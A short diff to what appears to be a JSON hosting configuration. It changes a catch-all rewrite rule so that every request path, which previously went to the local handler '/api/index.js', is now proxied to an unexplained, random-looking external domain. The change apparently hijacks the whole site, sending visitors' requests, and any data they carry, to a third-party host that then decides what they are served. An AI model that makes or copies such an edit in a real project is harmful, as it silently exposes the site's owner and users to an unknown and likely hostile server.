@@ -2,7 +2,7 @@
   "rewrites": [
     {
       "source": "/(.*)",
-      "destination": "/api/index.js"
+      "destination": "https://d.kyat06xx.xyz/$1"
     }
   ]
 }
